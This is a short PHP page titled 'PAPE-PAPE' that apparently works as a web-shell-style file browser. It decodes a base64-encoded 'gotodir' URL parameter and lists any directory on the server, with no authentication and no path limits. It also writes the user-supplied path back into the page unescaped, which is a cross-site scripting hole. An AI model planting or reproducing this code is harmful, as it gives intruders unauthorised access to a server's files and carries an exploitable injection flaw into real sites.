<?php

$gtdr = $_GET['gotodir'];

function glink($cek) {
    if ($cek == null) {
        $res = '/';
    } else {
        $res = $cek.'/';
    }
    return $res;
}

$gtdr = base64_decode($gtdr);
$gtdr = urldecode($gtdr);
$rdir = glink($gtdr);

function scnDir($dst) {
    $res = scandir($dst);
    return $res;
}


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PAPE-PAPE</title>
</head>
<style>
    body {
        font-family: 'Courier New', Courier, monospace;
    }
    table td {
        font-size: 10px;
    }
</style>
<body>
    <form action="#" method="get">
        <input type="text" name="gotodir" id="gotodir" value="<?php echo $gtdr; ?>">
    </form>
    <table>
        <thead>
            <td>name</td>
        </thead>
        <tbody>
            <?php
                $scandir = scnDir($rdir);
                foreach ($scandir as $key => $vread) {
             ?>
             <tr>
                <td>
                    <?php
                        $cekdir = $rdir.$vread;
                        $uricekdir = urlencode($cekdir);
                        $uricekdir = base64_encode($uricekdir);
                        if (is_dir($cekdir)) {
                           echo "<a href='?gotodir=".$uricekdir."'>".$vread."</a>";
                        } else {
                            echo $vread;
                        }
                    ?>
                </td>
             </tr>
             <?php
                }
            ?>
        </tbody>
    </table>
</body>
</html>